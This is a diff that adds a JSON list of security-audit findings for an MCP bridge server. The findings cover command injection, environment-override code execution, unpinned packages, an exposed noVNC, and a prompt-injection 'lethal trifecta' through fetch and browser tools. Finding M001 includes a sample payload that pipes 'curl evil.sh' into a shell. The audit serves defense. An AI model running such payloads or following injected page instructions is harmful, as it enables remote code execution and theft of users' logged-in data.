@@ -1,0 +1,380 @@
+[
+ {
+  "rule": "TOXIC-FLOW",
+  "severity": "high",
+  "file": "mcp-servers.json",
+  "line": 1,
+  "quote": "",
+  "message": "This setup gives one agent (1) a source of untrusted text: fetch, chrome-devtools-headful, playwright-headful, fetch; (2) access to private data: chrome-devtools-headful, playwright-headful, chrome-devtools-headful, playwright-headful; (3) a way to send data out: fetch, chrome-devtools-headful, playwright-headful, fetch. A single prompt injection in a web page, email or issue can make the agent read private data and send it away (the 'lethal trifecta').",
+  "confidence": "medium",
+  "owasp": "ASI01 / ASI02 (untrusted input + private data + way out)",
+  "fix": "Run the browser with an isolated, logged-out profile (--isolated=true), split fetch and browser servers across different agents, and require human approval for navigation/fetch to non-allowlisted hosts.",
+  "untrusted_input": [
+   "fetch",
+   "chrome-devtools-headful",
+   "playwright-headful",
+   "fetch",
+   "chrome-devtools-headful",
+   "playwright-headful"
+  ],
+  "private_data": [
+   "chrome-devtools-headful",
+   "playwright-headful",
+   "chrome-devtools-headful",
+   "playwright-headful"
+  ],
+  "exfiltration": [
+   "fetch",
+   "chrome-devtools-headful",
+   "playwright-headful",
+   "fetch",
+   "chrome-devtools-headful",
+   "playwright-headful"
+  ],
+  "id": "F001",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "mcp-servers.json",
+    "line": 5,
+    "quote": "\"args\": [\"mcp-server-fetch\"],"
+   },
+   {
+    "file": "mcp-servers.json",
+    "line": 13,
+    "quote": "\"--isolated=false\","
+   },
+   {
+    "file": "mcp-servers.json",
+    "line": 26,
+    "quote": "\"--cdp-endpoint=http://127.0.0.1:9222/\""
+   }
+  ],
+  "reason": "The bridge exposes fetch (untrusted web text and a way out) together with two servers driving the same non-isolated headful Chrome over CDP (logged-in sessions = private data), and the bridge adds no approval step; an injected instruction in a fetched page can make the agent read a logged-in site and send it out via fetch or navigation.",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "TLS-VERIFY-OFF",
+  "severity": "info",
+  "file": "deploy/e2b/sandbox_deploy.py",
+  "line": 692,
+  "quote": "async with httpx.AsyncClient(verify=False, timeout=5) as client:",
+  "message": "httpx.AsyncClient is called with verify=False, so HTTPS certificates are not checked (man-in-the-middle).",
+  "confidence": "high",
+  "owasp": "",
+  "fix": "Optional hardening: pin the sandbox certificate or probe through the E2B-provided TLS endpoint.",
+  "id": "F002",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deploy/e2b/sandbox_deploy.py",
+    "line": 695,
+    "quote": "resp = await client.get(f\"{https_url}/health\")"
+   }
+  ],
+  "reason": "verify=False is only used for an unauthenticated GET /health readiness probe to the self-signed sandbox; no token or data is sent and only the status code is used, so a MITM gains nothing beyond a wrong readiness answer.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "TLS-VERIFY-OFF",
+  "severity": "info",
+  "file": "deploy/e2b/sandbox_deploy.py",
+  "line": 877,
+  "quote": "async with httpx.AsyncClient(verify=False, timeout=5) as client:",
+  "message": "httpx.AsyncClient is called with verify=False, so HTTPS certificates are not checked (man-in-the-middle).",
+  "confidence": "high",
+  "owasp": "",
+  "fix": "Optional hardening as in F002.",
+  "id": "F003",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deploy/e2b/sandbox_deploy.py",
+    "line": 879,
+    "quote": "r1 = await client.get(f\"{https_url}/health\")"
+   }
+  ],
+  "reason": "Same keepalive /health probe as F002: no credentials sent, only the status code is read.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "severity": "low",
+  "file": "mcp-servers.example.json",
+  "line": 5,
+  "quote": "\"args\": [\"mcp-server-fetch\"],",
+  "message": "Server 'fetch' runs `mcp-server-fetch` through uvx without a pinned version.",
+  "confidence": "high",
+  "owasp": "ASI04 Agentic Supply Chain",
+  "fix": "Pin the version, e.g. \"mcp-server-fetch==<version>\".",
+  "server": "fetch",
+  "evidence": [
+   {
+    "file": "mcp-servers.example.json",
+    "line": 5,
+    "quote": "\"args\": [\"mcp-server-fetch\"],"
+   }
+  ],
+  "id": "F004",
+  "verdict": "confirmed",
+  "reason": "Example config launches mcp-server-fetch via uvx with no version, so each start can pull new code; the server holds no credentials.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "severity": "medium",
+  "file": "mcp-servers.example.json",
+  "line": 11,
+  "quote": "\"chrome-devtools-mcp@latest\",",
+  "message": "Server 'chrome-devtools-headful' runs `chrome-devtools-mcp@latest` through npx without a fixed version, so every start can download new code. A compromised or hijacked release runs on your machine immediately (rug pull).",
+  "confidence": "high",
+  "owasp": "ASI04 Agentic Supply Chain",
+  "fix": "Pin an exact version (chrome-devtools-mcp@x.y.z) and update deliberately.",
+  "server": "chrome-devtools-headful",
+  "evidence": [
+   {
+    "file": "mcp-servers.example.json",
+    "line": 11,
+    "quote": "\"chrome-devtools-mcp@latest\","
+   }
+  ],
+  "id": "F005",
+  "verdict": "confirmed",
+  "reason": "@latest is fetched on every start and the server controls a non-isolated (logged-in) Chrome, so a hijacked release gets those sessions.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "severity": "medium",
+  "file": "mcp-servers.example.json",
+  "line": 22,
+  "quote": "\"@playwright/mcp@latest\",",
+  "message": "Server 'playwright-headful' runs `@playwright/mcp@latest` through npx without a fixed version, so every start can download new code. A compromised or hijacked release runs on your machine immediately (rug pull).",
+  "confidence": "high",
+  "owasp": "ASI04 Agentic Supply Chain",
+  "fix": "Pin an exact version (@playwright/mcp@x.y.z).",
+  "server": "playwright-headful",
+  "evidence": [
+   {
+    "file": "mcp-servers.example.json",
+    "line": 22,
+    "quote": "\"@playwright/mcp@latest\","
+   }
+  ],
+  "id": "F006",
+  "verdict": "confirmed",
+  "reason": "@latest is fetched on every start and attaches over CDP to the same logged-in Chrome.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "severity": "low",
+  "file": "mcp-servers.json",
+  "line": 5,
+  "quote": "\"args\": [\"mcp-server-fetch\"],",
+  "message": "Server 'fetch' runs `mcp-server-fetch` through uvx without a pinned version.",
+  "confidence": "high",
+  "owasp": "ASI04 Agentic Supply Chain",
+  "fix": "Pin the version.",
+  "server": "fetch",
+  "evidence": [
+   {
+    "file": "mcp-servers.json",
+    "line": 5,
+    "quote": "\"args\": [\"mcp-server-fetch\"],"
+   }
+  ],
+  "id": "F007",
+  "verdict": "confirmed",
+  "reason": "Live config launches mcp-server-fetch via uvx unpinned; no credentials held. Note M002: request headers can also redirect the package index.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "severity": "medium",
+  "file": "mcp-servers.json",
+  "line": 11,
+  "quote": "\"chrome-devtools-mcp@latest\",",
+  "message": "Server 'chrome-devtools-headful' runs `chrome-devtools-mcp@latest` through npx without a fixed version, so every start can download new code. A compromised or hijacked release runs on your machine immediately (rug pull).",
+  "confidence": "high",
+  "owasp": "ASI04 Agentic Supply Chain",
+  "fix": "Pin an exact version.",
+  "server": "chrome-devtools-headful",
+  "evidence": [
+   {
+    "file": "mcp-servers.json",
+    "line": 11,
+    "quote": "\"chrome-devtools-mcp@latest\","
+   }
+  ],
+  "id": "F008",
+  "verdict": "confirmed",
+  "reason": "Live config: @latest on every start, controlling a non-isolated Chrome with the user's sessions.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "severity": "medium",
+  "file": "mcp-servers.json",
+  "line": 22,
+  "quote": "\"@playwright/mcp@latest\",",
+  "message": "Server 'playwright-headful' runs `@playwright/mcp@latest` through npx without a fixed version, so every start can download new code. A compromised or hijacked release runs on your machine immediately (rug pull).",
+  "confidence": "high",
+  "owasp": "ASI04 Agentic Supply Chain",
+  "fix": "Pin an exact version.",
+  "server": "playwright-headful",
+  "evidence": [
+   {
+    "file": "mcp-servers.json",
+    "line": 22,
+    "quote": "\"@playwright/mcp@latest\","
+   }
+  ],
+  "id": "F009",
+  "verdict": "confirmed",
+  "reason": "Live config: @latest on every start, attached over CDP to the same Chrome.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "/bridge spawns any command (and connects to any URL) taken from the HTTP request body",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/server/http-server.ts",
+    "line": 194,
+    "quote": "const { serverPath, method, params, args, env } = req.body;"
+   },
+   {
+    "file": "src/server/http-server.ts",
+    "line": 227,
+    "quote": "clientId = await this.mcpClient.createClient(serverPath, args, env);"
+   },
+   {
+    "file": "src/client/mcp-client-manager.ts",
+    "line": 69,
+    "quote": "command: serverPath,"
+   }
+  ],
+  "reason": "POST /bridge with {\"serverPath\":\"bash\",\"args\":[\"-c\",\"curl evil.sh|sh\"],\"env\":{...},\"method\":\"ping\",\"params\":{}} runs an arbitrary program with arbitrary args/env on the host; an http(s)/ws URL instead makes the bridge connect to any internal address (SSRF). Only the optional shared bearer token stands in front of it.",
+  "fix": "Remove free-form serverPath/args/env: let /bridge reference only server ids from mcp-servers.json (like /mcp/:serverId), or allowlist exact commands and reject request-supplied env.",
+  "id": "M001",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "X-MCP-ENV-* request headers override the environment of configured servers",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/server/http-server.ts",
+    "line": 383,
+    "quote": "overrides[envKey] = value;"
+   },
+   {
+    "file": "src/server/http-server.ts",
+    "line": 457,
+    "quote": "...headerEnvOverrides,"
+   },
+   {
+    "file": "src/stream/stream-session.ts",
+    "line": 46,
+    "quote": "env: mergedEnv,"
+   }
+  ],
+  "reason": "Any header X-MCP-ENV-<NAME> becomes an environment variable of the spawned npx/uvx server with no allowlist, so a caller of /mcp/:serverId can set NODE_OPTIONS (--import a data: module), NPM_CONFIG_REGISTRY / UV_INDEX_URL (install an attacker package for the unpinned @latest servers), PATH or LD_PRELOAD and get code execution, or override operator-set secrets such as N8N_API_URL to redirect credentials.",
+  "fix": "Accept only an explicit per-server allowlist of overridable variable names (e.g. N8N_API_KEY) and never allow NODE_OPTIONS, PATH, LD_*, NPM_CONFIG_*, UV_*, PYTHON*.",
+  "id": "M002",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "NETWORK-EXPOSURE",
+  "title": "Bearer token is optional and the server listens on all interfaces (optionally via ngrok)",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/server/http-server.ts",
+    "line": 42,
+    "quote": "this.logger.warn('No AUTH_TOKEN environment variable set. This is a security risk.');"
+   },
+   {
+    "file": "src/server/http-server.ts",
+    "line": 118,
+    "quote": "if (this.accessToken) {"
+   },
+   {
+    "file": "src/server/http-server.ts",
+    "line": 281,
+    "quote": "const server = this.app.listen(this.config.server.port, async () => {"
+   }
+  ],
+  "reason": "With AUTH_TOKEN/ACCESS_TOKEN empty (the .env.example default) every request passes, the app binds all interfaces, and --tunnel publishes it through ngrok, so anyone who can reach it gets M001/M002 code execution; the Origin check is skipped when ALLOWED_ORIGINS is empty, leaving browsers/DNS rebinding open too.",
+  "fix": "Refuse to start without a strong token, bind 127.0.0.1 by default, compare tokens with crypto.timingSafeEqual, and always validate Origin/Host for localhost use.",
+  "id": "M003",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "NETWORK-EXPOSURE",
+  "title": "E2B deploy exposes noVNC of the headful browser without a password by default",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "deploy/e2b/startup.sh",
+    "line": 346,
+    "quote": "X11VNC_AUTH_OPTS=(\"-nopw\")"
+   },
+   {
+    "file": "deploy/e2b/nginx.conf",
+    "line": 32,
+    "quote": "proxy_pass http://127.0.0.1:6080/;"
+   }
+  ],
+  "reason": "When VNC_PASSWORD is unset x11vnc runs with -nopw and nginx publishes noVNC at /novnc/ on the sandbox's public 443/80 ports without any auth, so anyone with the sandbox URL can watch and control the browser the agent uses.",
+  "fix": "Require VNC_PASSWORD (fail startup if unset) and put the /novnc/ locations behind the same bearer-token check (auth_request) as the bridge.",
+  "id": "M004",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "SECRET-IN-LOGS",
+  "title": "Full tool-call arguments logged at INFO",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/client/mcp-client-manager.ts",
+    "line": 128,
+    "quote": "this.logger.info(`Calling tool: ${JSON.stringify(params)}`);"
+   }
+  ],
+  "reason": "Every /bridge tools/call logs its full arguments (and line 195 logs the request body with only env masked), so credentials or personal data passed as tool arguments end up in logs.",
+  "fix": "Log tool name and argument keys only, or redact values at debug level.",
+  "id": "M005",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "UNPINNED-PACKAGE",
+  "title": "n8n-mcp wrapper runs an unpinned npx package with the full server environment",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/server/n8n-mcp-wrapper.ts",
+    "line": 8,
+    "quote": "const child = spawn('npx', ['n8n-mcp'], {"
+   },
+   {
+    "file": "src/server/n8n-mcp-wrapper.ts",
+    "line": 10,
+    "quote": "env: process.env,"
+   }
+  ],
+  "reason": "npx n8n-mcp downloads whatever version is current and receives the whole environment (including AUTH_TOKEN / NGROK_AUTH_TOKEN if set), so a hijacked release gets those secrets.",
+  "fix": "Pin n8n-mcp@<version> and pass only the variables it needs (N8N_API_URL, N8N_API_KEY).",
+  "id": "M006",
+  "quotes_verified": 2
+ }
+]
